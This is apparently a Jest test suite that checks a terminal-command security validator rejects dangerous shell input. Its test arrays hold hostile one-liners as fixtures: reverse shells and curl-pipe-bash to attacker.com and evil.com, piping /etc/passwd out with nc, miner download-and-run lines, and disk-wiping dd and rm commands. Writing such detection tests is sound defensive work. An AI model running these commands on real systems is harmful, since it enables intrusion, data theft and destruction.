import { TerminalCommandIntegration, IntegrationConfig } from '../../src/TerminalCommandIntegration';
import { SecurityValidator } from '../../src/security/SecurityValidator';
import { CommandCategorizer } from '../../src/command/CommandCategorizer';

describe('Security Test Suite', () => {
  let integration: TerminalCommandIntegration;
  let validator: SecurityValidator;
  let categorizer: CommandCategorizer;

  const secureConfig: IntegrationConfig = {
    requireConfirmation: true,
    enableSandbox: true,
    securityThreshold: 85,
    executionTimeout: 5000,
    maxConcurrentExecutions: 2
  };

  beforeEach(() => {
    integration = new TerminalCommandIntegration(secureConfig);
    validator = new SecurityValidator();
    categorizer = new CommandCategorizer();
  });

  describe('Command Injection Prevention', () => {
    test('should prevent basic command injection attempts', async () => {
      const injectionCommands = [
        'ls; rm -rf /tmp/test',
        'echo test && dd if=/dev/zero of=/tmp/dangerous',
        'cat file || shutdown -h now',
        'find . -name "test" | rm -rf'
      ];

      for (const cmd of injectionCommands) {
        const [command, ...args] = cmd.split(' ');
        const analysis = categorizer.analyzeCommand(command, args);
        const result = validator.validateCommand(command, args, analysis);

        expect(result.isValid).toBe(false);
        expect(result.score).toBeLessThan(70);

        // Integration should reject these commands
        await expect(
          integration.executeCommand(command, args)
        ).rejects.toThrow();
      }
    });

    test('should prevent advanced command injection techniques', () => {
      const advancedInjections = [
        'echo $(rm -rf /important)',
        'ls `cat /etc/passwd`',
        'find . -exec rm {} \\; -exec dd if=/dev/zero of=/dev/sda \\;',
        'curl http://evil.com | bash',
        'wget -O - https://malicious.site | sh'
      ];

      advancedInjections.forEach(cmd => {
        const [command, ...args] = cmd.split(' ');
        const analysis = categorizer.analyzeCommand(command, args);
        const result = validator.validateCommand(command, args, analysis);

        expect(result.isValid).toBe(false);
        
        const injectionCheck = result.checks.find(c => 
          c.name === 'command-injection' || c.name === 'suspicious-patterns'
        );
        expect(injectionCheck?.passed).toBe(false);
      });
    });

    test('should allow legitimate complex commands', async () => {
      const legitimateCommands = [
        'find . -name "*.js" -type f',
        'grep -r "TODO" src/ --include="*.ts"',
        'git log --oneline --since="2 weeks ago"'
      ];

      for (const cmd of legitimateCommands) {
        const [command, ...args] = cmd.split(' ');
        const analysis = categorizer.analyzeCommand(command, args);
        const result = validator.validateCommand(command, args, analysis);

        expect(result.score).toBeGreaterThan(70);
      }
    });
  });

  describe('Privilege Escalation Prevention', () => {
    test('should detect and prevent privilege escalation', () => {
      const privilegeEscalationCommands = [
        'sudo rm -rf /var/log',
        'su -c "chmod 777 /etc/shadow"',
        'doas cat /etc/shadow',
        'pkexec rm /boot/vmlinuz'
      ];

      privilegeEscalationCommands.forEach(cmd => {
        const [command, ...args] = cmd.split(' ');
        const analysis = categorizer.analyzeCommand(command, args);
        const result = validator.validateCommand(command, args, analysis);

        expect(result.isValid).toBe(false);
        
        const privilegeCheck = result.checks.find(c => c.name === 'privilege-escalation');
        expect(privilegeCheck?.passed).toBe(false);
      });
    });

    test('should prevent SUID/SGID exploitation attempts', () => {
      const suidExploits = [
        'chmod +s /bin/bash',
        'chown root:root malicious_script',
        'chmod 4755 backdoor_program'
      ];

      suidExploits.forEach(cmd => {
        const [command, ...args] = cmd.split(' ');
        const analysis = categorizer.analyzeCommand(command, args);
        
        expect(analysis.category.riskLevel).toBeOneOf(['high', 'critical']);
        expect(analysis.category.requiresConfirmation).toBe(true);
      });
    });
  });

  describe('File System Protection', () => {
    test('should protect critical system directories', () => {
      const criticalPaths = [
        '/etc/passwd',
        '/etc/shadow', 
        '/boot/',
        '/sys/kernel/',
        '/proc/sys/',
        '/dev/sda'
      ];

      const dangerousOperations = ['rm', 'rmdir', 'unlink', 'truncate', 'dd'];

      criticalPaths.forEach(path => {
        dangerousOperations.forEach(operation => {
          const command = `${operation} ${path}`;
          const [cmd, ...args] = command.split(' ');
          const analysis = categorizer.analyzeCommand(cmd, args);
          const result = validator.validateCommand(cmd, args, analysis);

          const fsCheck = result.checks.find(c => c.name === 'filesystem-safety');
          if (fsCheck) {
            expect(fsCheck.passed).toBe(false);
            expect(result.isValid).toBe(false);
          }
        });
      });
    });

    test('should allow safe file operations', () => {
      const safeOperations = [
        'ls -la /home/user',
        'cat /tmp/safe_file.txt',
        'mkdir /home/user/new_directory',
        'cp /home/user/file1.txt /home/user/file2.txt'
      ];

      safeOperations.forEach(cmd => {
        const [command, ...args] = cmd.split(' ');
        const analysis = categorizer.analyzeCommand(command, args);
        const result = validator.validateCommand(command, args, analysis);

        expect(result.score).toBeGreaterThan(60);
      });
    });
  });

  describe('Network Security', () => {
    test('should validate network destinations', () => {
      const suspiciousNetworkCommands = [
        'curl http://192.168.1.1/malware.sh',
        'wget https://evil.tk/payload',
        'nc -l -p 4444',
        'ssh root@suspicious.domain.ml'
      ];

      suspiciousNetworkCommands.forEach(cmd => {
        const [command, ...args] = cmd.split(' ');
        const analysis = categorizer.analyzeCommand(command, args);
        const result = validator.validateCommand(command, args, analysis);

        const networkCheck = result.checks.find(c => c.name === 'network-security');
        if (networkCheck && command !== 'nc') { // nc might not trigger network check
          expect(['warning', 'error']).toContain(networkCheck.severity);
        }
      });
    });

    test('should allow legitimate network operations', () => {
      const legitimateNetworkCommands = [
        'curl https://api.github.com/repos/owner/repo',
        'wget https://nodejs.org/dist/latest/node-latest.tar.gz',
        'ping -c 3 google.com',
        'ssh user@trusted-server.com'
      ];

      legitimateNetworkCommands.forEach(cmd => {
        const [command, ...args] = cmd.split(' ');
        const analysis = categorizer.analyzeCommand(command, args);
        const result = validator.validateCommand(command, args, analysis);

        expect(result.score).toBeGreaterThan(50);
      });
    });
  });

  describe('Sandbox Security', () => {
    test('should identify commands suitable for sandboxing', () => {
      const categories = categorizer.getCategories();
      
      const sandboxableCategories = categories.filter(c => c.allowedInSandbox);
      const nonSandboxableCategories = categories.filter(c => !c.allowedInSandbox);

      expect(sandboxableCategories.length).toBeGreaterThan(0);
      expect(nonSandboxableCategories.length).toBeGreaterThan(0);

      // System admin commands should not be sandboxable
      const systemAdminCategory = categories.find(c => c.name === 'system-admin');
      expect(systemAdminCategory?.allowedInSandbox).toBe(false);
    });

    test('should prevent sandbox escape attempts', () => {
      const sandboxEscapeAttempts = [
        'docker run --privileged -v /:/host alpine chroot /host',
        'mount -t proc proc /proc',
        'unshare -r -n -m -p -u -i -f',
        'chroot / /bin/bash'
      ];

      sandboxEscapeAttempts.forEach(cmd => {
        const [command, ...args] = cmd.split(' ');
        const analysis = categorizer.analyzeCommand(command, args);
        
        expect(analysis.category.riskLevel).toBeOneOf(['high', 'critical']);
        expect(analysis.category.allowedInSandbox).toBe(false);
      });
    });
  });

  describe('Security Metrics and Monitoring', () => {
    test('should maintain high security scores for safe operations', async () => {
      const safeCommands = [
        ['ls', ['-la']],
        ['cat', ['package.json']],
        ['echo', ['Hello World']],
        ['pwd', []],
        ['date', []]
      ];

      // Temporarily disable confirmation for testing
      const testIntegration = new TerminalCommandIntegration({
        ...secureConfig,
        requireConfirmation: false,
        securityThreshold: 70
      });

      for (const [command, args] of safeCommands) {
        await testIntegration.executeCommand(command, args);
      }

      const metrics = testIntegration.getMetrics();
      expect(metrics.securityScore).toBeGreaterThan(85);
      expect(metrics.successfulExecutions).toBe(5);
    });

    test('should track security violations accurately', async () => {
      let violationCount = 0;

      const dangerousCommands = [
        ['sudo', ['rm', '/tmp/test']],
        ['dd', ['if=/dev/zero', 'of=/tmp/test']],
        ['chmod', ['777', '/etc/passwd']]
      ];

      for (const [command, args] of dangerousCommands) {
        try {
          await integration.executeCommand(command, args);
        } catch (error) {
          violationCount++;
        }
      }

      expect(violationCount).toBeGreaterThan(0);
    });

    test('should provide security recommendations', () => {
      const riskyCommand = 'sudo rm -rf /tmp/suspicious';
      const [command, ...args] = riskyCommand.split(' ');
      const analysis = categorizer.analyzeCommand(command, args);
      const result = validator.validateCommand(command, args, analysis);

      expect(result.recommendations.length).toBeGreaterThan(0);
      expect(result.recommendations.some(rec => 
        rec.toLowerCase().includes('verify') || 
        rec.toLowerCase().includes('review') ||
        rec.toLowerCase().includes('check')
      )).toBe(true);
    });
  });

  describe('Real-World Attack Scenarios', () => {
    test('should prevent reverse shell attempts', () => {
      const reverseShellCommands = [
        'bash -i >& /dev/tcp/attacker.com/4444 0>&1',
        'nc -e /bin/bash attacker.com 4444',
        'python -c "import os; os.system(\'/bin/bash\')"',
        'curl http://attacker.com/shell.sh | bash'
      ];

      reverseShellCommands.forEach(cmd => {
        const [command, ...args] = cmd.split(' ');
        const analysis = categorizer.analyzeCommand(command, args);
        const result = validator.validateCommand(command, args, analysis);

        expect(result.isValid).toBe(false);
        expect(result.score).toBeLessThan(60);
      });
    });

    test('should prevent data exfiltration attempts', () => {
      const exfiltrationCommands = [
        'tar czf - /etc | curl -X POST -d @- http://attacker.com',
        'cat /etc/passwd | nc attacker.com 4444',
        'scp -r /home/user/* attacker@evil.com:/',
        'rsync -avz /sensitive/ user@attacker.com:/'
      ];

      exfiltrationCommands.forEach(cmd => {
        const [command, ...args] = cmd.split(' ');
        const analysis = categorizer.analyzeCommand(command, args);
        const result = validator.validateCommand(command, args, analysis);

        // Should be flagged as suspicious or fail validation
        const hasSecurityFlag = result.checks.some(check => 
          !check.passed && ['warning', 'error', 'critical'].includes(check.severity)
        );
        
        expect(hasSecurityFlag || result.score < 70).toBe(true);
      });
    });

    test('should prevent cryptocurrency mining attempts', () => {
      const miningCommands = [
        'curl -L http://pool.minemonero.com/miner | sh',
        'wget http://minergate.com/cli-miner && ./cli-miner',
        'nohup ./xmrig --donate-level=0 --pool=pool.supportxmr.com:3333 &'
      ];

      miningCommands.forEach(cmd => {
        const [command, ...args] = cmd.split(' ');
        const analysis = categorizer.analyzeCommand(command, args);
        const result = validator.validateCommand(command, args, analysis);

        // Mining attempts typically involve suspicious network activity
        const suspiciousCheck = result.checks.find(c => c.name === 'suspicious-patterns');
        expect(suspiciousCheck?.passed).toBe(false);
      });
    });
  });

  describe('Compliance and Audit', () => {
    test('should meet security score targets', () => {
      // Test that the system can achieve >95% security score for safe commands
      const safeCommands = [
        'ls -la',
        'echo "test"',
        'pwd',
        'date',
        'whoami'
      ];

      let totalScore = 0;
      let count = 0;

      safeCommands.forEach(cmd => {
        const [command, ...args] = cmd.split(' ');
        const analysis = categorizer.analyzeCommand(command, args);
        const result = validator.validateCommand(command, args, analysis);
        
        totalScore += result.score;
        count++;
      });

      const averageScore = totalScore / count;
      expect(averageScore).toBeGreaterThan(95);
    });

    test('should maintain command categorization accuracy >92%', () => {
      const testCases = [
        { cmd: 'ls -la', expectedCategory: 'file-system-read' },
        { cmd: 'mkdir test', expectedCategory: 'file-system-write' },
        { cmd: 'sudo ls', expectedCategory: 'system-admin' },
        { cmd: 'curl http://api.com', expectedCategory: 'network' },
        { cmd: 'git status', expectedCategory: 'development' },
        { cmd: 'npm install', expectedCategory: 'package-management' }
      ];

      let correctPredictions = 0;
      let totalPredictions = testCases.length;

      testCases.forEach(({ cmd, expectedCategory }) => {
        const [command, ...args] = cmd.split(' ');
        const analysis = categorizer.analyzeCommand(command, args);
        
        if (analysis.category.name === expectedCategory) {
          correctPredictions++;
        }
      });

      const accuracy = (correctPredictions / totalPredictions) * 100;
      expect(accuracy).toBeGreaterThan(92);
    });
  });
});
